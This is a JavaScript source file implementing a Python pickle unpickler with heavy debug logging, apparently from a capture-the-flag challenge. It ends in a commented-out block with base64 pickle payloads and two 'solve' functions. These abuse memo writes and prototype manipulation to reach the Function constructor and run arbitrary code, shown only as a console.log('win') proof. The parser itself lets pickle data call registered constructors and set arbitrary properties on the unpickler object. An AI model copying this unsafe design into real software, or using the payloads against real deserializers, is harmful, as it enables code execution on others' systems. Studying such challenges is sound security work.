import { super_constructor } from "../util.js";
import { Buffer } from "../buffer-polyfill.js";
import { Memory } from "./memory.js";
import { PICKLE_OP_NAMES, PICKLE_OP_VALUES, PICKLE_GLOBAL_SCOPE } from "./pickle-ops.js";

export function Unpickler(p, enc) /* extends Memory */ {
  var _this = this;
  _this = super_constructor(this, Unpickler, p);
  _this.pickle = p;
  _this.ind = 0;
  _this.buffer = Buffer.from(p, enc);
  _this.stack = [];
  _this.mark_stack = [];
  _this.result = _this._unpickle_impl()
  return _this;
}
// Inherit from class PythonObject
Object.setPrototypeOf(Unpickler.prototype, Memory.prototype);
PICKLE_GLOBAL_SCOPE['pickle.Unpickler'] = Unpickler;

PICKLE_GLOBAL_SCOPE['datetime.datetime'] = function(bin, tz) {
    var tmp = new Buffer(bin.buffer, 'binary');
    var year = tmp.readUInt16BE(0);
    var month = tmp.readUInt8(2) - 1;
    var day = tmp.readUInt8(3);
    var hour = tmp.readUInt8(4);
    var minute = tmp.readUInt8(5);
    var second = tmp.readUInt8(6);
    var microsecond = tmp.readUInt32BE(6) & 0xffffff;
    if (tz == 'UTC') {
        return new Date(Date.UTC(year, month, day, hour, minute, second, microsecond / 1000));
    } else {
        return new Date(year, month, day, hour, minute, second, microsecond / 1000);
    }
};

Unpickler.unpickle = function(s, enc) {
  return new Unpickler(s, enc).result;
}


Object.assign(Unpickler.prototype, {
  _pop() {
    var res = this.stack.pop();
    try {
      console.log("pop", res.toString().split('\n')[0]);
    } catch(e){
      console.log("pop", res);
    }

    for (var i=this.mark_stack.length - 1; i>=0; i--) {
      if (this.mark_stack[i] <= this.stack.length) {
        // Remove any marks that are no longer valid
        this.mark_stack.splice(i + 1);
        break;
      }
    }
    this._dump_stack();

    return res;
  },
  _peek() {
    var res = this.stack[this.stack.length - 1];
    try {
      console.log("peek", res.toString().split('\n')[0]);
    } catch(e){
      console.log("peek", res);
    }
    return res;
  },
  _dump_stack() {
    let s = this.stack.slice(0).reverse()
    console.log("    ,------------------------------------");
    for (let i= 0; i<s.length; i++) {
      let v = s[i];
      try {
        console.log("    | ", v.toString().split('\n')[0], this.mark_stack.indexOf(s.length-1-i) >= 0 ? "    <--- MARK" : "");
      } catch(e){ console.log("    |  <something> ")}
    }
    console.log("    '------------------------------------");
  },
  _push(v) {
    try {
      console.log("push", v.toString().split('\n')[0]);
    } catch(e){
      console.log("push", v);
    }

    this.stack.push(v);
    this._dump_stack();
  },
  _pushAll(a) {
    for (var i=0; i<a.length; i++) {
      this._push(a[i]);
    }
  },
  _mark() {
    this.mark_stack.push(this.stack.length);
  },
  _collect_since_marker() {
    if (this.mark_stack.length == 0) {
      return [];
    }
    let start = this.mark_stack.pop();
    let res = this.stack.splice(start);
    console.log('pop all', res);
    this._dump_stack();
    return res;
  },
  _setItems(obj, items) {
    for (var i = 0; i < items.length; i += 2) {
      var key = items[i];
      var value = items[i + 1];
      obj[key] = value;
    }
  },
  _long(l) {
    var s = 0;
    for (var i=0; i<l; i++) {
      let b = this._readu8();
      s += b * Math.pow(256, i);
    }
    return s;
  },

  _readchar() {
    let u8 = this._readu8();
    return String.fromCharCode(u8);
  },
  _readu8() {
    var res = this.buffer.readUInt8(this.ind);
    this.ind ++;
    return res;
  },
  _readu16() {
    var res = this.buffer.readUInt16LE(this.ind);
    this.ind += 2;
    return res;
  },
  _read32() {
    var res = this.buffer.readInt32LE(this.ind);
    this.ind += 4;
    return res;
  },
  _readu32() {
    var res = this.buffer.readUInt32LE(this.ind);
    this.ind += 4;
    return res;
  },
  _getUtf8Range(start, end) {
    var slice = this.buffer.slice(start, end);
    var res = slice.toString();
    console.log('utf8', start, end, res);
    return res;
  },
  _getByteRange(start, end) {
    var slice = this.buffer.slice(start, end);
    return new Uint8Array(slice.arrayBuffer());
  },
  _getUtf8(len) {
    var res = this._getUtf8Range(this.ind, this.ind + len);
    this.ind += len;
    return res;
  },
  _getBytes(len) {
    var res = this._getByteRange(this.ind, this.ind + len);
    this.ind += len;
    return res;
  },
  _readline() {
    var start = this.ind;
    while (this._readu8() != 0xa) { }
    var end = this.ind;
    return this._getUtf8Range(start, end-1);
  },
});


Unpickler.prototype._unpickle_impl = function() {
  console.log('unpickling',this.pickle);

  for (; this.ind < this.buffer.length ;) {
    var opcode = this._readu8();
    var opcode_char = String.fromCharCode(opcode);
    console.log('opcode', opcode.toString(16), opcode_char);

    var op_name = PICKLE_OP_VALUES[opcode_char];
    if (!op_name) {
      throw new Error(`Unknown opcode: \`${opcode.toString(16)}\``);
    }

    if (op_name == 'STOP') {
      break;
    }

    this._handle_opcode(op_name);
  }

  if (this.stack.length == 0) {
    throw new Error('No object on stack after pickle STOP opcode');
  }
  var res = this._pop();
  if (res === undefined) {
    throw new Error('No object on stack after pickle STOP opcode');
  }
  return res;
}

Unpickler.prototype._handle_opcode = function(opcode) {
  console.log('handling opcode', opcode);
  if (opcode == 'PROTO') {
    var proto = this._readu8();
    if ( proto != 2 && proto != 3) {
      throw new Error(`Unsupported pickle protocol: ${proto}`);
    }
  }
  else if (opcode == 'TUPLE1') {
    this._push([
      this._pop()
    ]);
  }
  else if (opcode == 'TUPLE2') {
    this._push([
      this._pop(),
      this._pop()
    ].reverse());
  }
  else if (opcode == 'TUPLE3') {
    this._push([
      this._pop(),
      this._pop(),
      this._pop()
    ].reverse());
  }
  else if (opcode == 'NEWTRUE') {
    this._push(true);
  }
  else if (opcode == 'NEWFALSE') {
    this._push(false);
  }
  else if (opcode == 'NONE') {
    this._push(null);
  }
  else if (opcode == 'INT') {
    var i = this._readline();
    this._push(parseInt(i));
  }
  else if (opcode == 'BININT') {
    var i = this._read32();
    this._push(i);
  }
  else if (opcode == 'BININT1') {
    var i = this._readu8();
    this._push(i);
  }
  else if (opcode == 'BININT2') {
    var i = this._readu16();
    this._push(i);
  }
  else if (opcode == 'LONG1') {
    var l = this._readu8();
    this._push(this._long(l));
  }
  else if (opcode == 'LONG4') {
    var l = this._readu32();
    this._push(this._long(l));
  }
  else if (opcode == 'POP') {
    this._pop();
  }
  else if (opcode == 'DUP') {
    let v = this._peek()
    this._push(v);
  }
  else if (opcode == 'EMPTY_LIST' || opcode == 'EMPTY_TUPLE') {
    this._push([]);
  }
  else if (opcode == 'EMPTY_DICT') {
    this._push({});
  }
  else if (opcode == 'MARK') {
    this._mark();
  }
  else if (opcode == 'POP_MARK') {
    this._collect_since_marker();
  }
  else if (opcode == 'GET') {
    let key = this._readline();
    console.log("Getting", key);
    this._push(this[key]);
  }
  else if (opcode == 'BINGET') {
    let key = this._readu8();
    console.log("Getting", key);
    this._push(this[key]);
  }
  else if (opcode == 'LONG_BINGET') {
    let key = this._readu32();
    console.log("Getting", key);
    this._push(this[key]);
  }
  else if (opcode == 'PUT') {
    let key = this._readline();
    let val = this._peek();
    console.log("Putting", key, val);
    this[key] = val;
  }
  else if (opcode == 'BINPUT') {
    let key = this._readu8();
    let val = this._peek();
    console.log("Putting", key, val);
    this[key] = val;
  }
  else if (opcode == 'LONG_BINPUT') {
    let key = this._readu32();
    let val = this._peek();
    console.log("Putting", key, val);
    this[key] = val;
  }
  else if (opcode == 'UNICODE') {
    var val = this._readline();
    this._push(val);
  }
  else if (opcode == 'SHORT_BINUNICODE') {
    var len = this._readu8();
    this._push(this._getUtf8(len));
  }
  else if (opcode == 'BINUNICODE') {
    var len = this._readu32();
    this._push(this._getUtf8(len));
  }
  else if (opcode == 'BINSTRING') {
    var len = this._readu32();
    this._push(this._getUtf8(len));
  }
  else if (opcode == 'SHORT_BINSTRING') {
    var len = this._readu8();
    this._push(this._getUtf8(len));
  }
  else if (opcode == 'NEWOBJ') {
    var args = this._pop();
    var constructor = this._pop();
    this._push(new constructor(args));
  }
  else if (opcode == 'REDUCE') {
    var args = this._pop();
    var constructor = this._pop();
    this._push(constructor(args));
  }
  else if (opcode == 'BUILD') {
    var args = this._pop();
    var obj = this._peek();
    for (var k in args) {
      obj[k] = args[k];
    }
  }
  else if (opcode == 'DICT') {
    var items = this._collect_since_marker();
    var obj = {};
    this._setItems(obj, items);
    this._push(obj);
  }
  else if (opcode == 'OBJ') {
    var items = this._collect_since_marker();
    var constructor = items.splice(0, 1)[0];
    var obj = this.create(constructor.prototype);
    this._setItems(obj, items);
    this._push(obj);
  }
  else if (opcode == 'SETITEM') {
    var value = this._pop();
    var key = this._pop();
    var obj = this._peek();
    obj[key] = value;
  }
  else if (opcode == 'SETITEMS') {
    var items = this._collect_since_marker();
    var obj = this._peek();
    this._setItems(obj, items);
  }
  else if (opcode == 'LIST' || opcode == 'TUPLE') {
    var items = this._collect_since_marker();
    this._push(items);
  }
  else if (opcode == 'APPEND') {
    var val = this._pop();
    var list = this._peek();
    var res = list.push(val);
    //TODOthis._push(res);
  }
  else if (opcode == 'APPENDS') {
    var items = this._collect_since_marker();
    var list = this._peek();
    var res = list.push.apply(list, items);
    //TODOthis._push(res);
  }
  else if (opcode == 'GLOBAL') {
    var module = this._readline();
    var name = this._readline();
    var g = PICKLE_GLOBAL_SCOPE[module + '.' + name];
    console.log(PICKLE_GLOBAL_SCOPE);
    if (g == undefined) {
      throw new Error(`Unknown global: ${module}.${name}`);
    }
    this._push(g);
  }
  else if (opcode == 'SHORT_BINBYTES') {
    var len = this._readu8();
    this._push(this._getBytes(len));
  }
  else if (opcode == 'BINBYTES') {
    var len = this._readu32();
    this._push(this._getBytes(len));
  }
  else {
    throw new Error(`Unsupported opcode: ${opcode}`);
  }
}





/*
//let u = Unpickler.unpickle('foobar');
//let u = Unpickler.unpickle('gAN9cQBYBQAAAGhlbGxvcQFYBQAAAHdvcmxkcQJzLg==');
//console.log(u)
//u = Unpickler.unpickle('gANjZGF0ZXRpbWUKZGF0ZXRpbWUKcQBDCgfnBQoVEREDW3dxAYVxAlJxAy4=');
//let u = SafeUnpickler.unpickle('gANnZ2V0UHJvdG90eXBlT2YKcQBnc2V0UHJvdG90eXBlT2YKcQFjYnVpbHRpbnMKZGljdApxAmgAaABScQMoaAJvcQRoAGgEUnEEZFZwdXNoCmgBcyhoBGgDZWgCVmNvbnNvbGUubG9nKCJ3aW4iKQpScQRdUg==', 'base64');
let u = SafeUnpickler.unpickle('gANjcGlja2xlClVucGlja2xlcgpxAGNidWlsdGlucwpkaWN0CnEBaAAoVR5WPTE7Y29uc29sZS5sb2coIndpbiIpCnJycnI9MS5sVnZhbHVlT2YKaAFzUl1S', 'base64');
console.log(u)

function copy(a,b) {
  for (let k in b) {
    a[k] = b[k];
  }
}

function solve1(){
  console.log("Solution 1");
  let gopd = u.get_memory('getOwnPropertyDescriptor');
  let dp = u.get_memory('defineProperty');
  console.log(gopd);
  console.log(dp);
  let gpo = u.get_memory('getPrototypeOf');
  console.log(gpo);
  let func_proto = gpo(gpo);
  console.log("function proto");
  let fake_arr = [];
  fake_arr['push'] = gopd;
  console.log(fake_arr);
  let prop_desc = fake_arr.push(func_proto, 'constructor');
  console.log(prop_desc);
  prop_desc['enumerable'] = true;
  fake_arr['push'] = dp;
  fake_arr.push(func_proto, 'constructor', prop_desc);
  console.log(func_proto);

  // Overwrite memory's constructor

  let v = new Unpickler();

  let mem_proto = gpo(v);
  console.log('before', mem_proto);
  copy(mem_proto, func_proto);
  let func_con = u.get_memory('constructor');
  console.log('after', func_con);
  console.log(func_con);
  let w = func_con('console.log(`win`)');
  w();

}//* /

function solve2() {
  console.log("Solution 2");
  let gpo = u.get_memory('getPrototypeOf');
  let spo = u.get_memory('setPrototypeOf');

  let func_proto = gpo(gpo);

  let v = new Unpickler();
  let up_proto = gpo(v);
  spo(up_proto, func_proto);
  console.log(gpo(up_proto))

  // Next run
  let res = Unpickler.unpickle('console.log(`win`)');

  console.log(res);
  console.log(res());
}
//solve2()


*/
